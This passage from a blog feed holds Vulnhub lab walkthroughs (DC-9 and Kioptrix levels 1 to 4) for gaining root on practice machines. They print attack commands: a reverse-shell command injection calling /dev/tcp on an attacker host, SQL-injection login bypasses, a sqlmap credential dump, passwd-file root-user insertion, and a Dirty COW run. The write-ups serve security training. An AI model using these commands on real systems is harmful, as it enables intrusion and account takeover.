class="hljs-built_in">argv</span>) != <span class="hljs-number">3</span> :<br>    <span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;Usage: python test.py read append&quot;</span>)<br>    sys.<span class="hljs-keyword">exit</span> (<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>)<br>    output = (<span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>())<br><br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">write</span>(output)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure><p>It seems that test.py file is the “key” to the root. Test.py is used to append the content of file A to another file B(root privilege). The most direct approach is to modify &#x2F;etc&#x2F;passwd.</p><p>generate the passwd:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>vulnhub/DC-<span class="hljs-number">9</span>]<br>└─<span class="hljs-comment"># openssl passwd -1 -salt ry4n 123456</span><br><span class="hljs-variable">$1</span><span class="hljs-variable">$ry4n</span><span class="hljs-variable">$S75u7SLn8eSw62A1NbqTj</span>/<br></code></pre></td></tr></table></figure><p>append user to &#x2F;etc&#x2F;passwd file:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;ry4n:$1$ry4n$S75u7SLn8eSw62A1NbqTj/:0:0::/root:/usr/bin/bash&#x27;</span> &gt; <span class="hljs-regexp">/tmp/ry</span>4n<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo /opt/devstuff/dist/test/test /tmp/ry4n /etc/passwd<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>su ry4n<br><span class="hljs-title class_">Password</span>: <br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_1</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_1/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_1/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-1"><a href="#vulnhub-kioptrix-level-1" class="headerlink" title="vulnhub_kioptrix_level_1"></a>vulnhub_kioptrix_level_1</h1><p>In the coming period, I will progressively update write-ups on various OSCP-LIKE machines, and this is my first write-up on vulnhub.</p><p>Firstly, alter the machine’s network connectivity mode to NAT and use <strong>arp-scan</strong> to acquire its IP address (this tool is highly efficient and convenient).</p><p>(-l param means localnet)</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132027468.png" alt="image-20231102132027468"></p><p>The target is 192.168.122.12.</p><p>The process of conducting a comprehensive port scan with <strong>nmap</strong> is quite time-consuming. Therefore, I prefer to utilize <strong>masscan</strong> initially to identify the open ports and subsequently perform a detailed scan with nmap.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132503180.png" alt="image-20231102132503180"></p><p>then it comes to nmap:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132553091.png" alt="image-20231102132553091"></p><p>nmap -sC -sS -sV -A -p 22,80,111,139,443,1024 192.168.122.12</p><p>What interests me most is the HTTP service running on port 80.</p><p>Now it’s time for <strong>dirsearch</strong> and <strong>nikto</strong>.</p><p>dirsearch for directory bruteforce:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133323051.png" alt="image-20231102133323051"></p><p>nothing interesting except &#x2F;usage:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133456170.png" alt="image-20231102133456170"></p><p>The tiny text at the bottom caught my attention：”generated by <strong>Webalizer</strong> Version 2.01”</p><p>I attempted to acquire something useful via searchsploit, preferably directly identifying exploitable vulnerabilities.</p><p>unfortunately：</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133925008.png" alt="image-20231102133925008"></p><p>Let’s turn to nikto!</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134035623.png" alt="image-20231102134035623"></p><p>It brings me a lot:</p><ul><li>outdated mod_ssl,apache,openssl</li><li>&#x2F;test.php</li><li>some php backdoor file manager(all of these are False Positives XD)</li></ul><p>The &#x2F;test.php page simply displays “TEST” without any other info, skip skip skip. Currently, the remaining that have not been tested are <strong>mod_ssl</strong>, Apache, and others.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134702818.png" alt="image-20231102134702818"></p><p>BINGO! Here comes several BOF vulnerabilities. I select <code>Apache mod_ssl &lt; 2.8.7 OpenSSL — ‘OpenFuckV2.c’ Remote Buffer Overflow (2)</code>, and then use -m param to copy it to my own dir.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134959536.png" alt="image-20231102134959536"></p><p>The usage of this script is indicated in the comments, but a error stopped me when I follow the command :<code>fatal error: openssl/ssl.h: No such file or directory</code> . No worries, just simply download it by <code>apt-get install libssl-dev``. However , a new issue has arisen as some functionalities have been deprecated. By consulting GPT, I found way to resolve it : adding the </code>-Wno-deprecated-declarations&#96; flag to ignore warnings. Now we can finally successfully compile it :</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102140039760.png" alt="image-20231102140039760"></p><p>The remaining steps are truely smooth. Simply follow the instructions and execute the exp — — Successfully gain access to root privileges !</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102140150839.png" alt="image-20231102140150839"></p><p>Wait Wait Wait 😝</p><p>Messages above are all about HTTP service on port 80, why not give SMB a try ? (Remembering that nmap scan tells us not only port 80 is open)</p><p>enum4linux — nothing:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141009194.png" alt="image-20231102141009194"></p><p>smbclient — nothing:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141130174.png" alt="image-20231102141130174"></p><p>Ultimately, utilize the MSF to detect the version of the SMB protocol.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141422083.png" alt="image-20231102141422083"></p><p>Samba 2.2.1a, turn to searchsploit:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141513795.png" alt="image-20231102141513795"></p><p>Perfect ! There exists a exploit script in MSF :</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141650432.png" alt="image-20231102141650432"></p><p>Everything appears to be progressing smoothly, but I am still unable to obtain a shell. The scenario appears in the provided image, where the shell connection is established but consistently interrupted, is highly likely to be attributed to a mismatch between the targets or payloads.</p><p>Let’s attempt to ultilize a more common payload: shell&#x2F;reverse_tcp instead of meterpreter&#x2F;reverse_tcp.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102142207965.png" alt="image-20231102142207965"></p><p>🎉🎉🎉</p><p>Welcome to communicate with me. Everything !</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_3</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_3/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_3/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-3"><a href="#vulnhub-kioptrix-level-3" class="headerlink" title="vulnhub_kioptrix_level_3"></a>vulnhub_kioptrix_level_3</h1><p>Here comes another walkthrough on KIOPTRIX series!</p><p>First off, we ought to modify &#x2F;etc&#x2F;hosts file and add the following line:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.122.14</span> #your target ip  kioptrix3.com<br></code></pre></td></tr></table></figure><p>Let’s start with some routine scan.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> -p1-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.122.14</span> --rate=<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106151902727.png" alt="image-20231106151902727"></p><p><code>nmap -sC -sS -sV -A -p 22,80 192.168.122.14</code></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231109085916455.png" alt="image-20231109085916455"></p><p>There’re only two open ports: port 22 and port 80.</p><p>Clearly, it’s evident that we need to focus on HTTP service.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -h <span class="hljs-number">192.168.122.14</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106152403497.png" alt="image-20231106152403497"></p><p>Sevaral results capture my interest which could have vulnerabilities, such as phpmyadmin(MYSQL).</p><p>Access it using firefox and attempt to login by brute force:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153305168.png" alt="image-20231106153305168"></p><p>Unfortunately, it doesn’t work.</p><p>For the next step, I intend to directly access http server on port 80:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153753112.png" alt="image-20231106153753112"></p><p>At the top of this page, there are three modules that can be observed:HOME, BLOG, and LOGIN.</p><p>After some experimentation, I have discovered a suspicious feature point where there may be a potential vulnerability for SQL injection — — sort.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106154444619.png" alt="image-20231106154444619"></p><p>Take a look at the url, the param ID interests me.</p><p>Let me perform a simple test by appending a <code>&#39;</code> after the parameter. An error has occurred!</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155105908.png" alt="image-20231106155105908"></p><p>SQLMAP:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">sqlmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=size#photos&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">gallery</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-type">dev_accounts</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">username</span><span class="hljs-operator">,</span><span class="hljs-variable">password</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155327482.png" alt="image-20231106155327482"></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155646715.png" alt="image-20231106155646715"></p><p>So far, I have obtained two accounts which can be successfully used to login using ssh.</p><p>Do you remember the login page on the homepage we haven’t access? Now let’s do it.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106160547043.png" alt="image-20231106160547043"></p><p>After unsuccessful attempts to access the backend using methods such as sql injection and brute force, I noticed the presence of ‘LotusCms’.</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit LotusCMS</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161007373.png" alt="image-20231106161007373"></p><p>Download the exp from google and then execute:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161303607.png" alt="image-20231106161303607"></p><p>We can also obtain a shell as well, however, the privilege is lower, compared to the previous one.</p><p>An indeed famous vulnerability caught my attention when I finished performing the inspection using linpeas — DIRTY COW.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106163430745.png" alt="image-20231106163430745"></p><p>I exploited it with firefart’s code.(<a href="https://github.com/firefart/dirtycow">firefart&#x2F;dirtycow: Dirty Cow exploit — CVE-2016–5195 (github.com)</a>)</p><p>Next, let us proceed step by step.</p><p>Compile:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>gcc -pthread dirty.c -o dirty -lcrypt<br>gcc -pthread dirty.c -o dirty -lcrypt<br>www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>ls<br>ls<br>dirty  dirty.c  exp.c  linpeas.sh<br></code></pre></td></tr></table></figure><p>Exploit:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>./dirty firefart<br>./dirty firefart<br>/etc/passwd successfully backed up to /tmp/passwd.bak<br><span class="hljs-title class_">Please</span> enter the new <span class="hljs-symbol">password:</span> firefart<br><span class="hljs-title class_">Complete</span> <span class="hljs-symbol">line:</span><br><span class="hljs-symbol">firefart:</span>fik57D3GJz/<span class="hljs-symbol">tk:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:pwned</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><br><span class="hljs-symbol">mmap:</span> b7fe0000<br></code></pre></td></tr></table></figure><p>Commands displayed above funtions to create a root-level firefart account with password firefart.</p><p>ROOT IT:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-variable">$ </span>su firefart<br>su firefart<br><span class="hljs-symbol">Password:</span> firefart<br><br>firefart<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-comment"># id</span><br>id<br>uid=<span class="hljs-number">0</span>(firefart) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_4</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_4/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_4/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-4"><a href="#vulnhub-kioptrix-level-4" class="headerlink" title="vulnhub_kioptrix_level_4"></a>vulnhub_kioptrix_level_4</h1><p>Welcome to the 4th installment of the multi-level KIOPTRIX vulnhub series, and there’s only one box left. Let’s dive into level 4!</p><p>Port scan with masscan:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133253518.png" alt="image-20231107133253518"></p><p>Service and vul scan for further details:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133425955.png" alt="image-20231107133425955"></p><p>It is evident that the focus is on the Samba and HTTP service.</p><p>enum4linux:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133847734.png" alt="image-20231107133847734"></p><p>The tool successfully enumerated several users on the target machine. Take a note for future reference.</p><p>smbclient:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134155918.png" alt="image-20231107134155918"></p><p>Nothing interesting.</p><p>dirsearch:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134416174.png" alt="image-20231107134416174"></p><p>I can finally discover something intriguing after inspecting each page carefully.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134937886.png" alt="image-20231107134937886"></p><p>This page leaked the username john.</p><p>Next step I choose to access the homepage via firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107140316236.png" alt="image-20231107140316236"></p><p>Here comes a classic login panel! Upon seeing this, multi thoughts come to my mind.</p><ul><li>SQLi</li><li>Brute force</li><li>CMS vul</li><li>…</li></ul><p>There’s no exploitable vulnerabilities about LigGoat and I couldn’t access valid accounts with brute force.</p><p>Let’s check if there exists a SQL injection.</p><p>Input a <code>&#39;</code> in both username and password blanks:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141050500.png" alt="image-20231107141050500"></p><p>An error occurred!</p><p>After further testing, I discovered that the password field is vulnerable to SQL injection. I attempted to access the backend by entering the username “john” and the password <code>’ or 1=1 #</code>or 1&#x3D;1# to validate this issue.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141341193.png" alt="image-20231107141341193"></p><p>I obtained the password for robert using the same approach.</p><p>john\MyNameIsJohn</p><p>robert\ADGAdsafdfwt4gadfga&#x3D;&#x3D;</p><p>Attempt to login as john using ssh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141854112.png" alt="image-20231107141854112"></p><p>The shell I obtained was severely restricted. However, I successfully bypass it using <code>echo os.system(&#39;/bin/bash&#39;)</code> and gained an interactive shell.</p><p>I could switch to robert account with the password obtained above, so I tried <code>sudo -l</code> to access higher privilege, but failed.</p><p>linpeas.sh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107143910329.png" alt="image-20231107143910329"></p><p>MYSQL!</p><p>I focused on finding leaked creds, and ultimately discovered the MySQL account password in the “checklogin” file.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107142736153.png" alt="image-20231107142736153"></p><p>Once connected to MySQL, I issued a SQL query to determine if UDF was available within MySQL.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144212528.png" alt="image-20231107144212528"></p><p>Fortunately, it’s available.</p><p>Solutions to gain root privilege I can think of are following:</p><ul><li>add john to admin group</li><li>manipulate the &#x2F;bin&#x2F;sh file</li></ul><p>First way:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144646517.png" alt="image-20231107144646517"></p><p>it worked!</p><p>Another:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144733073.png" alt="image-20231107144733073"></p><p>ROOT it!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Kioptrix_level_2</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_2/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_2/</url>
    
    <content type="html"><![CDATA[<h3 id="Vulnhub-Kioptrix-level-2"><a href="#Vulnhub-Kioptrix-level-2" class="headerlink" title="Vulnhub-Kioptrix_level_2"></a>Vulnhub-Kioptrix_level_2</h3><p>Default network connectivity of this machine is BRIDGE. I prefer using the NAT mode, however, I encountered an issue when attempting to modify the settings: after changing to NAT, upon restarting, it automatically switches back to BRIDGE mode.</p><p>Here are the solutions:</p><ul><li>Remove the network adapter.</li><li>Delete all lines in the vmx file that start with ethernet0.</li><li>Add a network adapter and select NAT mode.</li></ul><p>OK, Let’s begin our journey of penetration test !</p><p>Let us start with port scan and servece detection.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001655079.png" alt="image-20231104001655079"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001708692.png" alt="image-20231104001708692"></p><p>What captures my interest most is HTTP service running on port 80. Just move forward and check it with dirsearch and nikto etc.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002346009.png" alt="image-20231104002346009"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002355341.png" alt="image-20231104002355341"></p><p>Unfortunately, there is no information available that helps me go ahead.</p><p>So , I seek for the most direct approach and access port 80 by firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002812613.png" alt="image-20231104002812613"></p><p>What comes to me firstly and strongly is SQL INJECTION. I tried to fill the blank with <code>admin’ or 1=1 —</code> <code>123456</code>. Unbelievably , I directly accessed the backend , bypassing the limitation of admin panel.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104003451499.png" alt="image-20231104003451499"></p><p>Following is a classic PING functionality, where command injection comes to mind quite easy.</p><p>When I input 127.0.0.1:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104092922931.png" alt="image-20231104092922931"></p><p>PING command executed successfully as expected and I received correct response.</p><p>Then I turned to id command:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104093617893.png" alt="image-20231104093617893"></p><p>Got it! Now we can be sure that command injection can be performed over here. Through the same method we can gain a reverse shell as well by sending a command to create a reverse shell:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>; sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.122.111</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>At the same time, I recerved a bash shell successfully on my attack machine:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">──(root㉿kali)-[~/Desktop/vulnhub/kioptrix_2]<br>└─# nc -nlvp 4444<br>listening on [any] 4444 <span class="hljs-built_in">..</span>.<br>connect <span class="hljs-keyword">to</span> [192.168.122.111] <span class="hljs-keyword">from</span> (UNKNOWN) [192.168.122.13] 32789<br>sh: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> this shell<br>sh-3.00$ id<br><span class="hljs-attribute">uid</span>=48(apache) <span class="hljs-attribute">gid</span>=48(apache) <span class="hljs-attribute">groups</span>=48(apache)<br>sh-3.00$<br></code></pre></td></tr></table></figure><p>The preliminary step I undertake is uploading LINPEAS to seek for potential vulnerabilities that can be exploited.</p><p>We ought to initate a python http server on our machine, and then proceed to download linpeas onto the target machine using the wget command for subsequent execution.</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less">══════════════════════════════╣ <span class="hljs-selector-tag">System</span> <span class="hljs-selector-tag">Information</span> ╠══════════════════════════════                                                                                                                                <br>                              ╚════════════════════╝                                                                                                                                                              <br>╔══════════╣ <span class="hljs-selector-tag">Operative</span> <span class="hljs-selector-tag">system</span><br>╚ <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                </span><br><span class="hljs-selector-tag">Linux</span> <span class="hljs-selector-tag">version</span> <span class="hljs-number">2.6</span><span class="hljs-selector-class">.9-55</span><span class="hljs-selector-class">.EL</span> (mockbuild<span class="hljs-variable">@builder6</span>.centos.org) (gcc version <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span> <span class="hljs-number">20060404</span> (Red Hat <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span>-<span class="hljs-number">8</span>)) <span class="hljs-selector-id">#1</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">May</span> <span class="hljs-number">2</span> <span class="hljs-number">13</span>:<span class="hljs-number">52</span>:<span class="hljs-number">16</span> <span class="hljs-selector-tag">EDT</span> <span class="hljs-number">2007</span>                                                                           <br><span class="hljs-selector-tag">LSB</span> <span class="hljs-selector-tag">Version</span>:    :<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-noarch</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-noarch</span><br><span class="hljs-selector-tag">Distributor</span> <span class="hljs-selector-tag">ID</span>: <span class="hljs-selector-tag">CentOS</span><br><span class="hljs-selector-tag">Description</span>:    <span class="hljs-selector-tag">CentOS</span> <span class="hljs-selector-tag">release</span> <span class="hljs-number">4.5</span> (Final)<br><span class="hljs-selector-tag">Release</span>:        <span class="hljs-number">4.5</span><br><span class="hljs-selector-tag">Codename</span>:       <span class="hljs-selector-tag">Final</span><br></code></pre></td></tr></table></figure><p>Upon inspecting the system information section, it has been determined that the version identified is 2.6.9, specifically CentOS.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(root㉿kali)</span>-[~<span class="hljs-string">/Desktop/vulnhub/kioptrix_2</span>]<br>└─<span class="hljs-comment"># searchsploit centos 2.6.9             </span><br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br> Exploit Title                                                                                                                                                                  |  Path<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Linux Kernel 2.6 &lt; 2.6.19 <span class="hljs-params">(White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)</span> - &#x27;ip_append_data<span class="hljs-params">()</span>&#x27; Ring0 Privilege Escalation <span class="hljs-params">(1)</span>                                            | linux_x86/local/9542.c<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>Returning to the searchsploit once again, we can easily find an exploit for privilege escalation.</p><p>The final step is uploading the script to the target machine, compiling it, executing it, and then achieving a successful privilege escalation.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bash-3.00$ wget http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c -O <span class="hljs-string">/tmp/exp.c</span><br><span class="hljs-params">--01</span><span class="hljs-function">:35</span><span class="hljs-function">:39--</span>  http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c<br>           =&gt; `<span class="hljs-string">/tmp/exp.c</span>&#x27;<br>Connecting to 192.168.122.111<span class="hljs-function">:8080...</span> connected.<br>HTTP request sent, awaiting response.<span class="hljs-string">..</span> 200 OK<br>Length: 2,535 <span class="hljs-params">(2.5K)</span> [text/x-csrc]<br><br>    0K <span class="hljs-string">..</span>                                                    100%   36.08 MB/s<br><br>01<span class="hljs-function">:35</span><span class="hljs-function">:39</span> <span class="hljs-params">(36.08 MB/s)</span> - `<span class="hljs-string">/tmp/exp.c</span>&#x27; saved [2535/2535]<br><br>bash-3.00$ <span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>bash-3.00$ gcc -o exp exp.c &amp;&amp; <span 